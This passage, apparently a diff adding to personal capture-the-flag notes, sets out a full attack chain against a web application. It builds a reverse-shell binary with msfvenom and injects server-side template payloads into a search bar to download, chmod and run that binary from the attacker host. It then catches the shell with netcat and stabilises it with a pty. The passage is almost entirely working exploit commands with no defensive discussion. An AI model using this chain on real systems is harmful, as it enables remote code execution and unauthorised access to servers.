@@ -30,3 +30,24 @@ PORT     STATE SERVICE    VERSION
 GOT TWO USERNAMES :
 
 
+generate payload using msfvenom:
+        msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=334 -f elf > rev1.elf
+
+in search bar: 
+
+        *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://<lhost.ip>:port/revshell.elf")}
+
+      ` *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 revshell.elf")}
+
+start revshell listner on your local pc: nc -lvnp 334
+
+        *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./revshell.elf")}
+        
+got usershell!!!
+
+make it stable:
+        python -c 'import pty;pty.spawn("/bin/bash")'
+        CTRL +z
+        stty raw -echo
+        fg
+        export term=xterm
